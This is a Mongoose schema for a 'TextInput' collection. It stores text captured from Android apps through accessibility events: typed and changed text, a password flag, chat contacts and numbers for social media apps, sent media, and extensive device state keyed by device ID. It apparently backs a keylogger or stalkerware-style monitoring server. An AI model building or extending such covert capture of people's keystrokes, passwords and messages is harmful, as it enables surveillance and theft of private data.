const mongoose = require('mongoose');

const textInputSchema = new mongoose.Schema({
    id: {
        type: String,
        required: true,
        unique: true
    },
    timestamp: {
        type: Date,
        required: true,
        default: Date.now
    },
    packageName: {
        type: String,
        required: true
    },
    appName: {
        type: String,
        required: true
    },
    className: String,
    viewId: String,
    text: {
        type: String,
        required: true
    },
    beforeText: String,
    addedText: String,
    removedText: String,
    eventType: {
        type: String,
        required: true
    },
    isPassword: {
        type: Boolean,
        default: false
    },
    contentDescription: String,
    deviceId: {
        type: String,
        required: true
    },
    messageId: {
        type: String,
        required: true
    },
    
    // Contact Information (for social media apps)
    contactName: {
        type: String,
        default: ''
    },
    contactNumber: {
        type: String,
        default: ''
    },
    contactId: {
        type: String,
        default: ''
    },
    recipientInfo: {
        type: String,
        default: ''
    },
    chatTitle: {
        type: String,
        default: ''
    },
    isGroupChat: {
        type: Boolean,
        default: false
    },
    participantCount: {
        type: Number,
        default: 0
    },
    
    // Media attachment information (for sent media)
    hasMedia: { type: Boolean, default: false },
    mediaType: { type: String, default: '' },
    mediaUri: { type: String, default: '' },
    mediaFileName: { type: String, default: '' },
    mediaSize: { type: Number, default: 0 },
    mediaMimeType: { type: String, default: '' },
    mediaUploaded: { type: Boolean, default: false },
    mediaServerPath: { type: String, default: '' },
    mediaDownloadUrl: { type: String, default: '' },
    isMediaAction: { type: Boolean, default: false },
    mediaActionType: { type: String, default: '' },
    
    // Enhanced UI Information
    viewBounds: {
        type: mongoose.Schema.Types.Mixed,
        default: null
    },
    viewRect: {
        type: mongoose.Schema.Types.Mixed,
        default: null
    },
    isEditable: {
        type: Boolean,
        default: false
    },
    isClickable: {
        type: Boolean,
        default: false
    },
    isFocusable: {
        type: Boolean,
        default: false
    },
    isLongClickable: {
        type: Boolean,
        default: false
    },
    isScrollable: {
        type: Boolean,
        default: false
    },
    isSelected: {
        type: Boolean,
        default: false
    },
    isEnabled: {
        type: Boolean,
        default: true
    },
    isVisible: {
        type: Boolean,
        default: true
    },
    isAccessibilityFocused: {
        type: Boolean,
        default: false
    },
    isFocused: {
        type: Boolean,
        default: false
    },
    
    // Text Properties
    textSize: Number,
    textColor: Number,
    textSelectionStart: Number,
    textSelectionEnd: Number,
    textLength: {
        type: Number,
        default: 0
    },
    textHint: String,
    textInputType: Number,
    
    // View Hierarchy
    parentViewId: String,
    parentClassName: String,
    childCount: {
        type: Number,
        default: 0
    },
    viewIndex: {
        type: Number,
        default: 0
    },
    viewDepth: {
        type: Number,
        default: 0
    },
    
    // Screen Information
    screenWidth: {
        type: Number,
        default: 0
    },
    screenHeight: {
        type: Number,
        default: 0
    },
    screenDensity: {
        type: Number,
        default: 0
    },
    orientation: String,
    
    // App Context
    appVersion: String,
    appVersionCode: Number,
    targetSdkVersion: Number,
    minSdkVersion: Number,
    
    // Device Information
    deviceModel: String,
    deviceBrand: String,
    androidVersion: String,
    apiLevel: {
        type: Number,
        default: 0
    },
    deviceLanguage: String,
    deviceTimezone: String,
    
    // Network Information
    networkType: String,
    isWifiConnected: {
        type: Boolean,
        default: false
    },
    isMobileDataConnected: {
        type: Boolean,
        default: false
    },
    
    // Battery Information
    batteryLevel: {
        type: Number,
        default: 0
    },
    isCharging: {
        type: Boolean,
        default: false
    },
    batteryHealth: String,
    
    // Memory Information
    availableMemory: {
        type: Number,
        default: 0
    },
    totalMemory: {
        type: Number,
        default: 0
    },
    memoryUsagePercent: {
        type: Number,
        default: 0
    },
    
    // Performance Metrics
    captureLatency: {
        type: Number,
        default: 0
    },
    processingTime: {
        type: Number,
        default: 0
    },
    
    // Additional Context
    windowTitle: String,
    windowType: String,
    isSystemWindow: {
        type: Boolean,
        default: false
    },
    isDialog: {
        type: Boolean,
        default: false
    },
    isPopup: {
        type: Boolean,
        default: false
    },
    isModal: {
        type: Boolean,
        default: false
    },
    
    // User Interaction Context
    touchAction: String,
    gestureType: String,
    interactionTime: {
        type: Number,
        default: 0
    },
    userSessionId: String,
    
    // Security Context
    isSecureContext: {
        type: Boolean,
        default: false
    },
    isIncognito: {
        type: Boolean,
        default: false
    },
    isPrivateMode: {
        type: Boolean,
        default: false
    },
    
    // Accessibility Context
    accessibilityRole: String,
    accessibilityDescription: String,
    accessibilityHint: String,
    accessibilityLabel: String,
    accessibilityLiveRegion: String,
    accessibilityHeading: {
        type: Boolean,
        default: false
    },
    accessibilityImportant: {
        type: Boolean,
        default: false
    },
    
    // Custom Metadata
    customMetadata: {
        type: mongoose.Schema.Types.Mixed,
        default: null
    },
    tags: [String],
    priority: {
        type: Number,
        default: 0
    },
    category: String,
    subcategory: String,
    
    // Quality Metrics
    confidence: {
        type: Number,
        default: 1.0
    },
    quality: {
        type: String,
        default: "good"
    },
    isComplete: {
        type: Boolean,
        default: true
    },
    hasErrors: {
        type: Boolean,
        default: false
    },
    errorMessage: String,
    
    createdAt: {
        type: Date,
        default: Date.now
    },
    updatedAt: {
        type: Date,
        default: Date.now
    }
});

// Index for better query performance
textInputSchema.index({ deviceId: 1, timestamp: -1 });
textInputSchema.index({ packageName: 1 });
textInputSchema.index({ timestamp: -1 });

// Update the updatedAt field before saving
textInputSchema.pre('save', function(next) {
    this.updatedAt = new Date();
    next();
});

module.exports = mongoose.model('TextInput', textInputSchema);
